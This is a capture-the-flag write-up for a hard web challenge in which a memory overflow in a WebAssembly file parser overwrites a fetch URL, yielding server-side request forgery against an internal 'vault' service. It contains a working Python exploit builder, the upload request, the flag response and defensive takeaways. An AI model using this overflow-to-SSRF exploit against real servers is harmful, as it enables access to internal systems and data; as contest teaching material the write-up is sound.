# Linear Bleed — BCS CTF Writeup

**Category:** Web  
**Difficulty:** Hard  
**Points:** 499  
**Solves:** 4  
**Flag:** `bcsctf{w4sm_l1n34r_m3m0ry_0v3rfl0w_55rf_5ucc3ss}`

---

## Overview

The challenge runs a FastAPI server that accepts binary `.wmm` telemetry files, passes them through a **sandboxed WebAssembly parser**, and then makes an HTTP request to whatever URL the parser produces. The challenge claims WebAssembly's isolated linear memory model prevents host-level compromise. The goal is to prove it wrong.

---

## Understanding the Service

**`main.py`** (simplified):

```python
store = Store(engine)
instance = Instance(store, module, [])
exports = instance.exports(store)

exports["init_state"](store)
in_ptr = exports["get_input_ptr"](store)          # → 1280
_write(store, exports["memory"], in_ptr, raw)     # write our file into WASM memory

code = exports["parse_metadata"](store, len(raw)) # parse the .wmm file
if code != 0:
    raise HTTPException(...)

url_ptr = exports["get_target_url_offset"](store) # → 1140
buf = _read(store, exports["memory"], url_ptr, 128)
target = buf[:buf.find(b"\x00")].decode("latin1") # extract URL from WASM memory

# SSRF: the server fetches whatever URL is at offset 1140
urllib.request.urlopen(target, timeout=3.0)
```

The flow is:
1. We upload a `.wmm` file (max 4096 bytes)
2. WASM parser processes it and writes the "target URL" into its linear memory
3. Python reads 128 bytes from WASM memory at offset `1140` as the URL
4. The server makes a GET request to that URL and returns the result

The default URL in WASM memory is `http://vault:15002/api/v1/telemetry` — an internal service we can't reach directly.

---

## Reverse Engineering the WASM

Using `wasm-decompile` (from the `wabt` npm package), we get full pseudo-code for all exported functions.

### Memory Layout (after `init_state`)

```
Offset   Size  Contents
1024     36    rodata: default URL "http://vault:15002/api/v1/telemetry\0"
1060     16    state bytes (zeroed by init_state)
1076     64    TLMT chunk output buffer (zeroed by init_state)
1140     128   target URL buffer (copied from rodata by init_state)
1268     4     chunk counter int32 = 1
1280     4096  input buffer (our .wmm file is written here)
```

### WMM File Format

Reverse engineered from `parse_metadata`:

```
Offset  Size  Field
0       4     Magic: bytes [0x57, 0x4D, 0x4D, 0x46] = "WMMF" (LE int 0x464D4D57)
4       2     Version: uint16 LE = 1
6       2     Chunk count: uint16 LE (must be > 0)

--- Per chunk (starting at offset 8) ---
+0      4     Type: bytes [0x54, 0x4C, 0x4D, 0x54] = "TLMT" (LE int 0x544C4D54)
+4      4     Data length: uint32 LE
+8      N     Data bytes
+8+N    4     CRC32 of (type + data_length_field + data), standard zlib CRC32
```

Return codes: `1` = too short, `2` = bad magic, `3` = wrong version, `4` = zero chunks, `5`/`6` = chunk doesn't fit, `7` = CRC mismatch, `0` = success.

### The Vulnerability — TLMT Chunk Handler

The decompiled TLMT handler loop:

```c
// copies chunk data to WASM memory starting at 1076
for (int i = 0; i < data_length; i++) {
    memory[1076 + i] = chunk_data[i];  // NO bounds check on destination!
}
```

**The buffer at 1076 is only 64 bytes.** The URL buffer starts at `1076 + 64 = 1140`. Writing `data_length > 64` overflows into the URL buffer, overwriting whatever URL Python will later fetch.

This is the "Linear Bleed" — WASM's supposedly isolated linear memory is not safe from within-module logic bugs.

---

## Exploit

```python
import struct, zlib, requests

def build_wmm(url: str) -> bytes:
    magic   = b'\x57\x4D\x4D\x46'                # "WMMF"
    header  = magic + struct.pack('<HH', 1, 1)    # version=1, num_chunks=1

    ctype   = b'\x54\x4C\x4D\x54'                # "TLMT"
    padding = b'\x00' * 64                        # fills the safe 64-byte region
    data    = padding + url.encode() + b'\x00'    # overflows into URL buffer at 1140
    dlen    = struct.pack('<I', len(data))

    crc     = zlib.crc32(ctype + dlen + data) & 0xFFFFFFFF
    chunk   = ctype + dlen + data + struct.pack('<I', crc)

    return header + chunk
```

The 64 bytes of padding fill the TLMT output buffer exactly. Bytes 65+ overflow into WASM memory at `1140` — the URL buffer — replacing the default vault URL with our target.

### Finding the Flag Endpoint

Accessing `http://vault:15002/openapi.json` via SSRF reveals the full API spec:

```json
{
  "paths": {
    "/health": {...},
    "/api/v1/telemetry": {...},
    "/internal/system/flag": {"get": {"summary": "Get Flag", ...}}
  }
}
```

The hidden endpoint `/internal/system/flag` is not guessable from the default URL alone.

### Getting the Flag

```python
TARGET = "http://172.16.38.21:14503/api/analyze"
url = "http://vault:15002/internal/system/flag"

wmm = build_wmm(url)
r = requests.post(TARGET, files={"file": ("payload.wmm", wmm, "application/octet-stream")})
print(r.text)
```

**Response:**
```json
{
  "status": "success",
  "telemetry_source": "http://vault:15002/internal/system/flag",
  "data": {
    "status": "authenticated",
    "role": "cluster-root",
    "flag": "bcsctf{w4sm_l1n34r_m3m0ry_0v3rfl0w_55rf_5ucc3ss}"
  }
}
```

---

## Attack Chain Summary

```
Attacker uploads crafted .wmm
        │
        ▼
WASM parse_metadata processes TLMT chunk
        │
        ▼ buffer overflow (data_length > 64)
WASM linear memory[1140] ← our URL overwrites default vault URL
        │
        ▼
Python reads 128 bytes from offset 1140
        │
        ▼
SSRF: GET http://vault:15002/internal/system/flag
        │
        ▼
FLAG returned to attacker
```

---

## Key Takeaways

- **WASM linear memory isolation does NOT protect against logic bugs inside the module.** A C/Clang-compiled function with no bounds check on a memcpy destination is just as vulnerable inside a WASM sandbox as outside one.
- **SSRF via WASM-controlled URLs** is a real threat model: if untrusted input controls a URL that gets fetched server-side, sandbox isolation of the parser is irrelevant.
- **API enumeration matters:** the flag endpoint `/internal/system/flag` was hidden from the default flow but exposed by `/openapi.json` — always probe documentation endpoints.
